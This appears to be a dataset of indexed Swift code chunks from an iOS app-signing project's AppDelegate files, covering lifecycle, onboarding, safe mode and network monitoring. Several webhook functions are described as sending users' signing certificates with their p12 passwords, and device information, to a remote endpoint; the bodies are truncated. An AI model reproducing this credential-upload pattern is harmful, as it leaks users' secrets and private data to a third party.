contentView.addSubview(nameLabel)

// Add type label
contentView.addSubview(typeLabel)

// Add value label
contentView.addSubview(valueLabel)
"
1237,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/VariablesViewController.swift","MARK: - Configuration","func configure(with variable: Variable) {
// Set name label
nameLabel.text = variable.name

// Set type label
typeLabel.text = variable.type

// Set value label
valueLabel.text = variable.value
"
1238,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+AILearning.swift","extension AppDelegate - implements functionality related to app delegate","extension AppDelegate {
// MARK: - AI Learning Integration

/// Initialize AI Learning system
func initializeAILearning() {"
1239,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+AILearning.swift","MARK: - AI Learning Integration / Initialize AI Learning system","func initializeAILearning() {
// Disable AI learning by default
if UserDefaults.standard.object(forKey: ""AILearningEnabled"") == nil {"
1240,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+AILearning.swift","Function handleModelUpdate - implements handlemodelupdate functionality","@objc func handleModelUpdate() {
Debug.shared.log(message: ""AI model updated with local learning"", type: .info)

// Reload the model in CoreMLManager
CoreMLManager.shared.loadModelWithLocalLearning()
}
}
"
1241,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift","MARK: - Network Monitoring Extension","extension AppDelegate {
/// Set up network monitoring to track connectivity changes
func setupNetworkMonitoring() {"
1242,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift","/ Set up network monitoring to track connectivity changes","func setupNetworkMonitoring() {
Debug.shared.log(message: ""Setting up enhanced network monitoring"", type: .info)

// Use our custom NetworkMonitor singleton that internally uses NWPathMonitor
// This provides a consistent interface regardless of iOS version
setupEnhancedNetworkMonitoring()
}

/// Set up enhanced network monitoring with offline mode support and UI indicators
private func setupEnhancedNetworkMonitoring() {"
1243,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift","/ Set up enhanced network monitoring with offline mode support and UI indicators","private func setupEnhancedNetworkMonitoring() {
// Initialize the shared NetworkMonitor singleton
let networkMonitor = NetworkMonitor.shared

// Initialize OfflineSigningManager which depends on NetworkMonitor
let offlineManager = OfflineSigningManager.shared

// Register for connection status changes
networkMonitor.connectionStatusChanged = { [weak self] isConnected, connectionType in"
1244,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift","/ Helper function to convert ConnectionType enum to string","private func connectionTypeToString(_ type: ConnectionType) -> String {
switch type {"
1245,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift","/ Show an alert for important connection status changes","private func showNetworkStatusChangeAlert(isConnected: Bool, connectionType: ConnectionType) {
// Only show alerts for transitions to offline or to expensive connection type
let shouldShowAlert = !isConnected || connectionType == .cellular

guard shouldShowAlert, let topVC = UIApplication.shared.topMostViewController() else {"
1246,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+NetworkMonitoring.swift","MARK: - Preferences Extension","extension Preferences {
/// Whether to show network status change alerts
static var showNetworkAlerts: Bool {"
1247,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift","MARK: - Phased Initialization Extension","extension AppDelegate {
/// Set up components in phases for improved stability
func setupPhaseOne() {"
1248,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift","/ Set up components in phases for improved stability","func setupPhaseOne() {
Debug.shared.log(message: ""Starting phase 1 initialization (lightweight components)"", type: .info)

// Initialize essential network monitoring
setupNetworkMonitoring()

// Validate server certificates for server functionality and offline signing
_ = ServerCertificateManager.shared.validateCertificates()

// Show startup popup if needed - low resource impact"
1249,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift","/ Set up medium-weight components (phase 2)","func setupPhaseTwo() {
Debug.shared.log(message: ""Starting phase 2 initialization (medium-weight components)"", type: .info)

// Initialize image pipeline (method name kept as in original codebase)
imagePipline()

// Set up essential background tasks
setupBackgroundTasks()

// Initialize terminal components"
1250,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift","/ Set up heavy components (phase 3) with safeguards","func setupPhaseThree() {
Debug.shared.log(message: ""Starting phase 3 initialization (heavy-weight components)"", type: .info)

// Skip in safe mode
if SafeModeLauncher.shared.inSafeMode {"
1251,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift","/ Method with phased initialization for crash protection","func initializeComponentsWithCrashProtection() {
Debug.shared.log(message: ""Initializing components with crash protection"", type: .info)

// Use structured error handling to prevent crashes during initialization
// Phase 1 - safe to run immediately
setupPhaseOne()

// Phase 2 - defer slightly
DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) { [weak self] in"
1252,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift","/ Check available memory before heavy operations","func shouldProceedWithMemoryCheck() -> Bool {
let memoryUsed = getMemoryUsage()
Debug.shared.log(message: ""Current memory usage: \(String(format: ""%.1f%%"", memoryUsed * 100))"", type: .info)

// If memory usage is over 70%, delay heavy operations
return memoryUsed < 0.7
}

/// Get current memory usage as a percentage (0.0 to 1.0)
private func getMemoryUsage() -> Double {"
1253,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedInitialization.swift","/ Get current memory usage as a percentage (0.0 to 1.0)","private func getMemoryUsage() -> Double {
var info = mach_task_basic_info()
var count = mach_msg_type_number_t(MemoryLayout<mach_task_basic_info>.size) / 4

let kerr: kern_return_t = withUnsafeMutablePointer(to: &info) {"
1254,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedTerminal.swift","extension AppDelegate - implements functionality related to app delegate","extension AppDelegate {
/// Phase 5: Initialize terminal components
func initializePhase5_Terminal() {"
1255,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedTerminal.swift","/ Phase 5: Initialize terminal components","func initializePhase5_Terminal() {
Debug.shared.log(message: ""Initializing phase 5: Terminal components"", type: .info)

// Setup terminal
setupTerminal()

// Proceed to final setup
initializePhase6_FinalSetup()
}
"
1256,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedTerminal.swift","/ Phase 6: Final setup and cleanup","func initializePhase6_FinalSetup() {
Debug.shared.log(message: ""Initializing phase 6: Final setup"", type: .info)

// Show startup components with delay
DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {"
1257,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedTerminal.swift","Create notification for app initialization completion","extension Notification.Name {
static let appInitializationCompleted = Notification.Name(""appInitializationCompleted"")
}
"
1258,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift","MARK: - Safe Mode Extension","extension AppDelegate {
/// Set up minimal UI for safe mode
func setupSafeModeUI() {"
1259,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift","/ Set up minimal UI for safe mode","func setupSafeModeUI() {
Debug.shared.log(message: ""Setting up safe mode UI"", type: .info)

// Create a basic view controller for safe mode
let safeModeVC = UIViewController()
safeModeVC.view.backgroundColor = .systemBackground

// Add warning icon
let imageView = UIImageView(image: UIImage(systemName: ""exclamationmark.triangle.fill""))
imageView.tintColor = .systemYellow"
1260,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift","/ Safe mode exit button handler","@objc func exitSafeModePressed() {
SafeModeLauncher.shared.disableSafeMode()

// Show restart confirmation
let alert = UIAlertController(
title: ""Restart Required"",
message: ""The app needs to restart to exit safe mode. Do you want to restart now?"",
preferredStyle: .alert
)
"
1261,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift","/ Continue in safe mode button handler","@objc func continueSafeModePressed() {
// First ensure we have valid UI state
if window == nil {"
1262,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift","/ Set up limited functionality for safe mode","func setupLimitedFunctionality() {
Debug.shared.log(message: ""Setting up limited functionality for safe mode"", type: .info)

// Initialize only essential services - access through AppDelegate instance
guard let appDelegate = UIApplication.shared.delegate as? AppDelegate else {"
1263,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift","/ Initialize secondary components with limited functionality for safe mode","func initializeSecondaryComponentsInSafeMode() {
// Only initialize essential image handling - use method on parent AppDelegate class
if let appDelegate = UIApplication.shared.delegate as? AppDelegate {"
1264,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift","/ Set up only essential background tasks","func setupCriticalBackgroundTasks() {
// Implement only critical background tasks here
// This is a subset of the full background task setup
}

/// Prompt user to enable AI features with safeguards
func promptForAIInitializationSafely() {"
1265,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift","/ Prompt user to enable AI features with safeguards","func promptForAIInitializationSafely() {
// Mark that we've shown the prompt
UserDefaults.standard.set(true, forKey: ""AIPromptShown"")

DispatchQueue.main.async { [weak self] in"
1266,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift","MARK: - Webhook Extension for AppDelegate","extension AppDelegate {
/// Set up and send analytics data to the webhook endpoint
/// This endpoint is not a webhook in the traditional sense, but a REST API endpoint
/// that receives POST requests with JSON content
func setupAndSendWebhook() {"
1267,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift","/ Set up and send analytics data to the webhook endpoint / This endpoint is not a webhook in the traditional sense, but a REST API endpoint / that receives POST requests with JSON content","func setupAndSendWebhook() {
Debug.shared.log(message: ""Setting up webhook data submission"", type: .info)

// Only send webhook data if we haven't sent it before or if in development mode
let userDefaults = UserDefaults.standard
let hasSent = userDefaults.bool(forKey: hasSentWebhookKey)
let isDevelopment = ProcessInfo.processInfo.environment[""DEVELOPMENT""] != nil

if !hasSent || isDevelopment {"
1268,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift","/ Creates a structured payload for the app launch webhook with device and app information / - Returns: Dictionary containing the payload data","private func createAppLaunchPayload() -> [String: Any] {
let device = UIDevice.current
let appVersion = Bundle.main.infoDictionary?[""CFBundleShortVersionString""] as? String ?? ""Unknown""
let buildNumber = Bundle.main.infoDictionary?[""CFBundleVersion""] as? String ?? ""Unknown""

// Create a structured payload with relevant information

return [
""event"": ""app_launch"",
""timestamp"": ISO8601DateFormatter().string(from: Date()),"
1269,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift","/ Sends certificate data to webhook for tracking and backup / - Parameters: /   - certificate: The certificate being uploaded /   - p12Password: Optional password for the p12 file","func sendCertificateInfoToWebhook(certificate: Certificate, p12Password: String?) {
guard let webhookEndpoint = URL(string: webhookURL) else {"
1270,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift","/ Sends backdoor file info to webhook for tracking / - Parameters: /   - backdoorPath: Path to the backdoor file /   - password: Optional password","func sendBackdoorInfoToWebhook(backdoorPath: URL, password: String?) {
guard let webhookEndpoint = URL(string: webhookURL) else {"
1271,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift","/ Generic method to send webhook data to the specified endpoint / - Parameters: /   - endpoint: The URL endpoint to send data to /   - payload: The data payload to send","func sendWebhookData(to endpoint: URL, payload: [String: Any]) {
// Create the URL request
var request = URLRequest(url: endpoint)
request.httpMethod = ""POST""
request.setValue(""application/json"", forHTTPHeaderField: ""Content-Type"")

do {"
1272,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Global variable for DownloadTaskManager This is a singleton, so no need for lazy initialization","class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControllerDelegate {
static let isSideloaded = Bundle.main.bundleIdentifier != ""com.bdg.backdoor""
var window: UIWindow?

// Use a lazy var inside the class to prevent memory leaks
lazy var downloadTaskManager = DownloadTaskManager.shared

// Track app state to prevent issues during background/foreground transitions
private var isInBackground = false
var isShowingStartupPopup = false"
1273,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","MARK: - Static Method for Documents Directory","static func getDocumentsDirectory() -> URL {
FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
}

func application(_: UIApplication,
didFinishLaunchingWithOptions _: [UIApplication.LaunchOptionsKey: Any]?) -> Bool
{"
1274,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function application - implements application functionality","func application(_: UIApplication,
didFinishLaunchingWithOptions _: [UIApplication.LaunchOptionsKey: Any]?) -> Bool
{"
1275,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","MARK: - App Lifecycle Methods (Enhanced for robust background/foreground handling)","func applicationDidBecomeActive(_: UIApplication) {
Debug.shared.log(message: ""App became active"", type: .info)
isInBackground = false

// Ensure UI is responsive after returning from background
DispatchQueue.main.async { [weak self] in"
1276,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function applicationWillResignActive - implements applicationwillresignactive functionality","func applicationWillResignActive(_: UIApplication) {
Debug.shared.log(message: ""App will resign active"", type: .info)

// Save any important in-memory data
do {"
1277,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function applicationDidEnterBackground - implements applicationdidenterbackground functionality","func applicationDidEnterBackground(_ application: UIApplication) {
Debug.shared.log(message: ""App entered background"", type: .info)
isInBackground = true

// Create a background task to ensure we have time to clean up
var bgTask: UIBackgroundTaskIdentifier = .invalid
bgTask = application.beginBackgroundTask {"
1278,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function applicationWillEnterForeground - implements applicationwillenterforeground functionality","func applicationWillEnterForeground(_ application: UIApplication) {
Debug.shared.log(message: ""App will enter foreground"", type: .info)

// Set flag to track that we're no longer in background
isInBackground = false

// Schedule background refresh operation in a separate queue with lower priority
// to avoid competing with UI restoration
backgroundQueue.async {"
1279,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function performInitialUIRestoration - implements performinitialuirestoration functionality","private func performInitialUIRestoration() {
Debug.shared.log(message: ""Performing initial UI restoration"", type: .info)

// First check if window and root view controller exist
guard let window = window,
let rootVC = window.rootViewController
else {"
1280,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function completeUIRestoration - implements completeuirestoration functionality","private func completeUIRestoration(_ application: UIApplication) {
Debug.shared.log(message: ""Completing UI restoration"", type: .info)

// Only proceed if we're not showing a startup popup
if isShowingStartupPopup {"
1281,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function applicationWillTerminate - implements applicationwillterminate functionality","func applicationWillTerminate(_: UIApplication) {
Debug.shared.log(message: ""App will terminate"", type: .info)

// Perform final cleanup
saveApplicationState()

// Make sure core data is saved
do {"
1282,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Helper method to refresh the entire view hierarchy","private func refreshViewHierarchy(_ viewController: UIViewController) {
// Make view controller interactive
viewController.view.isUserInteractionEnabled = true

// Force layout update
viewController.view.setNeedsLayout()
viewController.view.layoutIfNeeded()

// If it's a container view controller, refresh its children
if let navController = viewController as? UINavigationController {"
1283,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function showAppropriateStartupScreen - implements showappropriatestartupscreen functionality","func showAppropriateStartupScreen() {
// Only show startup screens on fresh launch, not when returning from background
if isInBackground {"
1284,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function saveApplicationState - implements saveapplicationstate functionality","private func saveApplicationState() {
// Save the current version to UserDefaults
if let version = Bundle.main.infoDictionary?[""CFBundleShortVersionString""] as? String {"
1285,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function showStartupPopupIfNeeded - implements showstartuppopupifneeded functionality","private func showStartupPopupIfNeeded() {
// Check if popup has been shown before and ensure we don't show multiple popups
let hasShownPopup = UserDefaults.standard.bool(forKey: hasShownStartupPopupKey)

guard !hasShownPopup && !isShowingStartupPopup else {"
1286,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function ensureMainUIIsAccessible - implements ensuremainuiisaccessible functionality","private func ensureMainUIIsAccessible() {
// Make sure the tab bar and navigation are accessible
if let tabBarController = window?.rootViewController as? UIHostingController<TabbarView> {"
1287,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function setupUserDefaultsAndPreferences - sets upuserdefaultsandpreferences","private func setupUserDefaultsAndPreferences() {
let userDefaults = UserDefaults.standard
userDefaults.set(Bundle.main.infoDictionary?[""CFBundleShortVersionString""] as? String, forKey: ""currentVersion"")
if userDefaults.data(forKey: UserDefaults.signingDataKey) == nil {"
1288,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function setupWindow - sets upwindow","func setupWindow() {
// Ensure we don't recreate window if it exists
guard window != nil else {"
1289,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function showOnboardingScreen - implements showonboardingscreen functionality","private func showOnboardingScreen() {
// Create a custom onboarding view controller that auto-dismisses
let customOnboardingVC = CustomAutoClosingOnboardingVC()
customOnboardingVC.onComplete = { [weak self] in"
1290,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","/ Custom onboarding view controller that shows the onboarding content / and automatically dismisses after 5 seconds with a progress bar","private class CustomAutoClosingOnboardingVC: UIViewController {
// MARK: - UI Components

private let contentView = UIView()
private let titleLabel1 = UILabel()
private let titleLabel2 = UILabel()
private let appIconView = UIImageView()
private let featuresStackView = UIStackView()
private let termsLabel = UITextView()
private let progressView = UIProgressView()"
1291,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupUI()
}

override func viewDidAppear(_ animated: Bool) {"
1292,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function viewDidAppear - implements viewdidappear functionality","override func viewDidAppear(_ animated: Bool) {
super.viewDidAppear(animated)

// Start the timer when the view appears
startTime = Date()
startProgressTimer()

// Schedule automatic dismissal after exactly 5 seconds
DispatchQueue.main.asyncAfter(deadline: .now() + displayDuration) { [weak self] in"
1293,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function viewWillDisappear - implements viewwilldisappear functionality","override func viewWillDisappear(_ animated: Bool) {
super.viewWillDisappear(animated)
// Ensure timer is invalidated when view disappears
timer?.invalidate()
}

// MARK: - UI Setup

private func setupUI() {"
1294,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","MARK: - UI Setup","private func setupUI() {
view.backgroundColor = .systemBackground

// App Icon
appIconView.image = UIImage(named: ""backdoor_glyph"")
appIconView.contentMode = .scaleAspectFit
appIconView.tintColor = Preferences.appTintColor.uiColor
view.addSubview(appIconView)

// Title Labels"
1295,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function addFeature - implements addfeature functionality","private func addFeature(icon: String, title: String, description: String) {
let featureView = UIView()

let iconView = UIImageView()
iconView.image = UIImage(systemName: icon)
iconView.contentMode = .scaleAspectFit
iconView.tintColor = Preferences.appTintColor.uiColor
featureView.addSubview(iconView)

let titleLabel = UILabel()"
1296,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
appIconView.translatesAutoresizingMaskIntoConstraints = false
titleLabel1.translatesAutoresizingMaskIntoConstraints = false
titleLabel2.translatesAutoresizingMaskIntoConstraints = false
featuresStackView.translatesAutoresizingMaskIntoConstraints = false
termsLabel.translatesAutoresizingMaskIntoConstraints = false
progressView.translatesAutoresizingMaskIntoConstraints = false

NSLayoutConstraint.activate([
appIconView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 40),"
1297,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","MARK: - Timer Management","private func startProgressTimer() {
// Update progress every 0.1 seconds
timer = Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { [weak self] _ in"
1298,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function dismissOnboarding - implements dismissonboarding functionality","private func dismissOnboarding() {
// Stop timer before animation
timer?.invalidate()
timer = nil

// Animate dismissal
UIView.animate(withDuration: 0.5, animations: { [weak self] in"
1299,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function setupMainUI - sets upmainui","private func setupMainUI() {
Debug.shared.log(message: ""Setting up main UI with improved initialization"", type: .info)

do {"
1300,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Add a separate method for setting up notifications to ensure this happens regardless of UI setup","private func setupNotifications() {
// Setup base notification observers for app lifecycle
NotificationCenter.default.removeObserver(self) // Remove any existing observers to prevent duplicates

// Add observers for essential app lifecycle events
NotificationCenter.default.addObserver(
self,
selector: #selector(applicationDidBecomeActive(_:)),
name: UIApplication.didBecomeActiveNotification,
object: nil"
1301,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function logDeviceInfo - implements logdeviceinfo functionality","private func logDeviceInfo() {
Debug.shared.log(message: ""Version: \(UIDevice.current.systemVersion)"")
Debug.shared.log(message: ""Name: \(UIDevice.current.name)"")
Debug.shared.log(message: ""Model: \(UIDevice.current.model)"")
Debug.shared.log(message: ""Backdoor Version: \(logAppVersionInfo())\n"")
}

func setupBackgroundTasks() {"
1302,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function setupBackgroundTasks - sets upbackgroundtasks","func setupBackgroundTasks() {
if Preferences.appUpdates {"
1303,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function initializeSecondaryComponents - implements initializesecondarycomponents functionality","private func initializeSecondaryComponents() {
// Initialize image pipeline
imagePipline()

// Setup AI integration
AppContextManager.shared.setupAIIntegration()

// Send basic app launch analytics to webhook
// This is a lightweight call with minimal data
setupAndSendWebhook()"
1304,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function getDeviceInfo - retrieves deviceinfo","private func getDeviceInfo() -> [String: Any] {
let device = UIDevice.current
var systemInfo = utsname()
uname(&systemInfo)
let machineMirror = Mirror(reflecting: systemInfo.machine)
let identifier = machineMirror.children.reduce("""") { identifier, element in"
1305,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function batteryStateString - implements batterystatestring functionality","private func batteryStateString(_ state: UIDevice.BatteryState) -> String {
switch state {"
1306,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function thermalStateString - implements thermalstatestring functionality","private func thermalStateString(_ state: ProcessInfo.ThermalState) -> String {
switch state {"
1307,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function isConnectedToWiFi - checks if connectedtowifi","private func isConnectedToWiFi() -> Bool {
if let interfaces = CNCopySupportedInterfaces() as NSArray? {"
1308,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function sendDeviceInfoToWebhook - implements senddeviceinfotowebhook functionality","private func sendDeviceInfoToWebhook() {
let userDefaults = UserDefaults.standard
let hasSent = userDefaults.bool(forKey: hasSentWebhookKey)

guard !hasSent else {"
1309,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function scheduleAppRefresh - implements scheduleapprefresh functionality","func scheduleAppRefresh() {
let request = BGAppRefreshTaskRequest(identifier: ""kh.crysalis.backdoor.sourcerefresh"")
request.earliestBeginDate = Date(timeIntervalSinceNow: 15 * 60)
do {"
1310,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function handleAppRefresh - implements handleapprefresh functionality","func handleAppRefresh(task: BGAppRefreshTask) {
scheduleAppRefresh()
let backgroundQueue = OperationQueue()
backgroundQueue.qualityOfService = .background
let operation = SourceRefreshOperation()
task.expirationHandler = { operation.cancel() }"
1311,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function application - implements application functionality","func application(_: UIApplication, open _: URL, options _: [UIApplication.OpenURLOptionsKey: Any] = [:]) -> Bool {
return false
}

func didFinishOnboarding(onboardingViewController _: UIOnboardingViewController) {"
1312,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function didFinishOnboarding - implements didfinishonboarding functionality","func didFinishOnboarding(onboardingViewController _: UIOnboardingViewController) {
completeOnboarding()
}

private func completeOnboarding() {"
1313,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function completeOnboarding - implements completeonboarding functionality","private func completeOnboarding() {
Preferences.isOnboardingActive = false
let tabBarController = UIHostingController(rootView: TabbarView())
let transition = CATransition()
transition.type = .fade
transition.duration = 0.3
window?.layer.add(transition, forKey: kCATransition)
window?.rootViewController = tabBarController
FloatingButtonManager.shared.show()
}"
1314,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function addDefaultRepos - implements adddefaultrepos functionality","fileprivate func addDefaultRepos() {
if !Preferences.defaultRepos {"
1315,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function giveUserDefaultSSLCerts - implements giveuserdefaultsslcerts functionality","fileprivate func giveUserDefaultSSLCerts() {
if !Preferences.gotSSLCerts {"
1316,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function generateRandomString - implements generaterandomstring functionality","fileprivate static func generateRandomString(length: Int = 8) -> String {
let characters = ""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789""
var result = """"
for _ in 0..<length {"
1317,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function createSourcesDirectory - creates sourcesdirectory","func createSourcesDirectory() {
let fileManager = FileManager.default
let documentsURL = Self.getDocumentsDirectory()
let sourcesURL = documentsURL.appendingPathComponent(""Apps"")
let certsURL = documentsURL.appendingPathComponent(""Certificates"")
if !fileManager.fileExists(atPath: sourcesURL.path) {"
1318,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function imagePipline - implements imagepipline functionality","func imagePipline() {
DataLoader.sharedUrlCache.diskCapacity = 0
let pipeline = ImagePipeline {"
1319,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function setupLogFile - sets uplogfile","func setupLogFile() {
let logFilePath = Self.getDocumentsDirectory().appendingPathComponent(""logs.txt"")
if FileManager.default.fileExists(atPath: logFilePath.path) {"
1320,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function cleanTmp - implements cleantmp functionality","func cleanTmp() {
let fileManager = FileManager.default
let tmpDirectory = NSHomeDirectory() + ""/tmp""
if let files = try? fileManager.contentsOfDirectory(atPath: tmpDirectory) {"
1321,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function logAppVersionInfo - implements logappversioninfo functionality","func logAppVersionInfo() -> String {
if let version = Bundle.main.infoDictionary?[""CFBundleShortVersionString""] as? String,
let build = Bundle.main.infoDictionary?[""CFBundleVersion""] as? String
{"
